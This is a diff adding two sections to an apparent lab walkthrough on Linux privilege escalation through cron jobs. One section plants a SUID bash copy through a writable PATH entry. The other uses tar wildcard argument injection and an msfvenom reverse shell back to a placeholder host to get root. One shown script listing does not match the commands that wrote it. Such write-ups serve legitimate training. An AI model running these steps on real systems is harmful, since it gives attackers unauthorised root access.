@@ -287,3 +287,114 @@ Cron jobs are liked scheduled tasks in Windows, they system wide schedule is loc
     root    
     ```
 # Task 9 - Cron Jobs - PATH Environment Variable
+Cron jobs are liked scheduled tasks in Windows, they system wide schedule is located in /etc/crontab
+* View the system cron tab
+    ```
+    user@debian:~$ cat /etc/crontab
+    # /etc/crontab: system-wide crontab
+    # Unlike any other crontab you don't have to run the `crontab'
+    # command to install the new version when you edit this file
+    # and files in /etc/cron.d. These files also have username fields,
+    # that none of the other crontabs do.
+
+    SHELL=/bin/sh
+    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+    # m h dom mon dow user  command
+    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    #
+    * * * * * root overwrite.sh
+    * * * * * root /usr/local/bin/compress.sh
+    ```
+* Note the path above starts with /home/user, this can be exploited
+* Create a file called overwrite.sh in the home directory
+    ```
+    user@debian:~$ cd
+    user@debian:~$ echo "#!/bin/bash" > overwrite.sh
+    -bash: !/bin/bash": event not found
+    user@debian:~$ echo '#!/bin/bash' > overwrite.sh
+    user@debian:~$ echo 'cp /bin/bash /tmp/rootbash' >> overwrite.sh
+    user@debian:~$ echo 'chmod +xs /tmp/rootbash' >> overwrite.sh
+    user@debian:~$ ls -lrta overwrite.sh
+    -rw-r--r-- 1 user user 64 Jan 29 09:32 overwrite.sh
+    user@debian:~$ cat overwrite.sh
+    #!/bin/bash
+    cp /bin/bash /tmp/root/bash
+    chmod +xs /tmp/rootbash
+    user@debian:~$ 
+    ```
+* Make the file executable
+    ```
+    user@debian:~$ chmod +x overwrite.sh 
+    user@debian:~$
+    ```
+* Wait for the cron job to run that creates /tmp/rootbash, then execute it
+    ```
+    user@debian:~$ /tmp/rootbash -p
+    rootbash-4.1# whoami
+    root
+    ```
+# Task 10 - Cron Jobs - Wildcards
+Cron jobs are liked scheduled tasks in Windows, they system wide schedule is located in /etc/crontab
+* View the compress.sh script
+    ```
+    user@debian:~$ cat /usr/local/bin/compress.sh
+    #!/bin/sh
+    cd /home/user
+    tar czf /tmp/backup.tar.gz *
+    ```
+* The tar command is being executed with a wildcard, this can be exploited
+* Reference GTFOBins for tar: https://gtfobins.github.io/gtfobins/tar/
+* Create an ELF binary with msfvenom
+    ```
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f elf -o shell.elf
+    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+    [-] No arch selected, selecting arch: x64 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 74 bytes
+    Final size of elf file: 194 bytes
+    Saved as: shell.elf
+    ```
+* Transfer the file
+    ```
+    sudo python3 -m http.server 80
+    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+    user@debian:~$ wget http://a.b.c.d/shell.elf
+    --2021-01-29 09:47:41--  http://a.b.c.d/shell.elf
+    Connecting to a.b.c.d:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 194 [application/octet-stream]
+    Saving to: “shell.elf”
+
+    100%[===========================================================================================================================>] 194         --.-K/s   in 0s      
+
+    2021-01-29 09:47:42 (44.1 MB/s) - “shell.elf” saved [194/194]
+
+    user@debian:~$ ls -lrta shell.elf
+    -rw-r--r-- 1 user user 194 Jan 29 09:39 shell.elf
+    ```
+* Set the file to executable
+    ```
+    user@debian:~$ chmod +x shell.elf
+    user@debian:~$ 
+    ```
+* Create two files that are interpreted by tar as command line arguments when the compress.sh script is run, when tar sees them, they will be included in the tar command in the script
+    ```
+    user@debian:~$ touch /home/user/--checkpoint=1
+    user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
+
+    user@debian:~$ ls
+    --checkpoint=1  --checkpoint-action=exec=shell.elf  myvpn.ovpn  overwrite.sh  shell.elf  tools
+    ```
+* Create a listener and then wait for the cron to run, check the shell
+    ```
+    nc -nvlp 1234
+    listening on [any] 1234 ...
+    connect to [a.b.c.d] from (UNKNOWN) [10.10.10.141] 33241
+    whoami
+    root
+    ```
